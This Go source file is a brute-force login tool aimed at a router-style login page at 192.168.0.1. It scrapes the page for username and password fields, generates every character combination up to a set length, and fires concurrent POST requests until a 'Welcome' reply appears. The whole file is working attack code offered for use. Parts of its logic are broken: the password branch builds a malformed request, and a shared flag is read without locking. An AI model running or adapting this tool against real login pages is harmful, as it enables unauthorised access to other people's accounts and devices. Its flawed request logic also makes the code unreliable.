package main

import (
	"bytes"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/html"
)

// Configuration for brute force attack
type Config struct {
	BaseURL     string
	Charset     string
	MaxLength   int
	Concurrency int
}

// Shared state to manage brute force attempts
type BruteForceState struct {
	Found    bool
	Attempts int
	Username string
	Password string
	Mutex    sync.Mutex
}

// Main function
func main() {
	// Initialize configuration and shared state
	config := Config{
		BaseURL:     "http://192.168.0.1/login.html",
		Charset:     "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()",
		MaxLength:   4,
		Concurrency: 10,
	}

	state := BruteForceState{}
	startTime := time.Now()

	// Run the brute force attack
	runBruteForce(config, &state)

	// Output results after completion
	duration := time.Since(startTime)
	if state.Found {
		fmt.Printf("Username: %s\nPassword: %s\nAttempts: %d\nTime taken: %v\n", state.Username, state.Password, state.Attempts, duration)
	} else {
		fmt.Println("Credentials not found within the given length constraints.")
	}
}

// Run brute force attempts with concurrency using worker pools
func runBruteForce(config Config, state *BruteForceState) {
	// Fetch the initial page to detect fields
	usernameField, passwordField, nextPage := detectFields(config.BaseURL)

	if usernameField != "" && passwordField != "" {
		// Both fields on the same page: attempt concurrently
		fmt.Println("Attempting to crack username and password concurrently...")
		performConcurrentAttack(config, state, usernameField, passwordField)
	} else if usernameField != "" {
		// Username on this page, password on the next: sequential cracking
		fmt.Println("Username found, attempting to crack username first...")
		crackedUsername := performSequentialAttack(config, state, usernameField, "")
		if crackedUsername != "" {
			// Attempt cracking password on the next page
			passwordField, _ = detectNextPageFields(nextPage)
			if passwordField != "" {
				fmt.Println("Username cracked. Now attempting to crack the password...")
				performSequentialAttack(config, state, "", passwordField)
			}
		}
	} else if passwordField != "" {
		// Only password field present, attempt to crack it
		fmt.Println("Only password field detected, attempting to crack...")
		performSequentialAttack(config, state, "", passwordField)
	}
}

// Detect form fields (username, password) on the current page
func detectFields(url string) (usernameField, passwordField, nextPage string) {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("Error fetching the page:", err)
		return
	}
	defer resp.Body.Close()

	// Parse the HTML document
	doc := html.NewTokenizer(resp.Body)
	for {
		tokenType := doc.Next()
		if tokenType == html.ErrorToken {
			break
		}

		// Identify input fields and potential next-page links
		token := doc.Token()
		if tokenType == html.StartTagToken && token.Data == "input" {
			var inputType, id, name, placeholder string
			for _, attr := range token.Attr {
				switch attr.Key {
				case "type":
					inputType = attr.Val
				case "id":
					id = attr.Val
				case "name":
					name = attr.Val
				case "placeholder":
					placeholder = attr.Val
				}
			}

			// Check attributes to determine if it's a username or password field
			if inputType == "text" || strings.Contains(id, "user") || strings.Contains(name, "user") || strings.Contains(placeholder, "user") {
				usernameField = id
			} else if inputType == "password" || strings.Contains(id, "pass") || strings.Contains(name, "pass") || strings.Contains(placeholder, "pass") {
				passwordField = id
			}
		}

		// Detect links or buttons to identify potential next pages for multi-page forms
		if tokenType == html.StartTagToken && (token.Data == "a" || token.Data == "button") {
			for _, attr := range token.Attr {
				if attr.Key == "href" {
					nextPage = attr.Val
				}
			}
		}
	}

	return
}

// Detect fields on the next page if navigation is required
func detectNextPageFields(url string) (passwordField, nextPage string) {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("Error fetching the next page:", err)
		return
	}
	defer resp.Body.Close()

	// Similar parsing logic to detect password fields on the next page
	doc := html.NewTokenizer(resp.Body)
	for {
		tokenType := doc.Next()
		if tokenType == html.ErrorToken {
			break
		}

		token := doc.Token()
		if tokenType == html.StartTagToken && token.Data == "input" {
			var inputType, id, name, placeholder string
			for _, attr := range token.Attr {
				switch attr.Key {
				case "type":
					inputType = attr.Val
				case "id":
					id = attr.Val
				case "name":
					name = attr.Val
				case "placeholder":
					placeholder = attr.Val
				}
			}

			if inputType == "password" || strings.Contains(id, "pass") || strings.Contains(name, "pass") || strings.Contains(placeholder, "pass") {
				passwordField = id
			}
		}
	}

	return
}

// Concurrently attempt to crack username and password
func performConcurrentAttack(config Config, state *BruteForceState, usernameField, passwordField string) {
	var wg sync.WaitGroup
	passwords := make(chan string, config.Concurrency)

	// Run worker pool for concurrent username and password cracking
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go worker(config, state, passwords, usernameField, passwordField, &wg)
	}

	// Generate passwords for cracking attempts
	generatePasswords(config, passwords)
	close(passwords)
	wg.Wait()
}

// Sequentially crack username or password
func performSequentialAttack(config Config, state *BruteForceState, usernameField, passwordField string) string {
	passwords := make(chan string, config.Concurrency)
	var wg sync.WaitGroup

	// Run worker pool for sequential attempts
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go worker(config, state, passwords, usernameField, passwordField, &wg)
	}

	// Generate passwords for cracking attempts
	generatePasswords(config, passwords)
	close(passwords)
	wg.Wait()

	// Return the cracked username or password after successful attempts
	if usernameField != "" {
		return state.Username
	} else if passwordField != "" {
		return state.Password
	}
	return ""
}

// Worker function to process password attempts
func worker(config Config, state *BruteForceState, passwords <-chan string, usernameField, passwordField string, wg *sync.WaitGroup) {
	defer wg.Done()
	for password := range passwords {
		if state.Found {
			return
		}

		// Attempt login with current password and detect successful attempts
		success, foundUsername := attemptLogin(config, usernameField, passwordField, password)
		state.Mutex.Lock()
		state.Attempts++
		if success {
			state.Found = true
			if foundUsername {
				state.Username = password
			} else {
				state.Password = password
			}
		}
		state.Mutex.Unlock()
	}
}

// Attempt login to the target URL with a given username or password
func attemptLogin(config Config, usernameField, passwordField, value string) (bool, bool) {
	var data string
	if usernameField != "" {
		// If cracking the username, only send the username field
		data = fmt.Sprintf("%s=%s", usernameField, value)
	} else if passwordField != "" {
		// If cracking the password, send the stored username and the password attempt
		data = fmt.Sprintf("%s=%s&%s=%s", usernameField, value, passwordField, value)
	}

	// Send the login request
	req, err := http.NewRequest("POST", config.BaseURL, bytes.NewBufferString(data))
	if err != nil {
		return false, false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return false, false
	}
	defer resp.Body.Close()

	// Check for success based on status codes and expected content
	if resp.StatusCode == http.StatusOK {
		// Check response body for success indication (specific text)
		buf := new(bytes.Buffer)
		buf.ReadFrom(resp.Body)
		if strings.Contains(buf.String(), "Welcome") { // Customize the success detection text
			return true, usernameField != ""
		}
	}

	return false, false
}

// Generate potential passwords or usernames for brute force attempts
func generatePasswords(config Config, passwords chan<- string) {
	for length := 1; length <= config.MaxLength; length++ {
		generateCombination("", length, config.Charset, passwords)
	}
}

// Recursive function to generate combinations of potential passwords
func generateCombination(prefix string, maxLength int, charset string, passwords chan<- string) {
	if len(prefix) == maxLength {
		passwords <- prefix
		return
	}
	for _, c := range charset {
		generateCombination(prefix+string(c), maxLength, charset, passwords)
	}
}
